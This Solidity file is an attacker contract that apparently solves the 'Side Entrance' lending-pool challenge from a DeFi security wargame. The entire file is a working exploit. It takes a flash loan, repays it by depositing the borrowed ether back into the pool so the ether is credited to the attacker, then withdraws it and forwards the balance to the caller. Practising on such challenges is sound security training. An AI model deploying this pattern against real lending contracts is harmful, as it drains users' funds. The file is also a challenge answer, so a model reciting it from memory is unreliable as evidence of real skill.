// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    address pool;
    constructor(address _pool) {
        pool = _pool;
    }

    function execute() external payable {
        (bool success, )  = pool.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );

        require(success, "Pool deposit failed");
    }

    function attack(uint _amount) external {
        SideEntranceLenderPool(pool).flashLoan(_amount);
        SideEntranceLenderPool(pool).withdraw();

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {

    }
}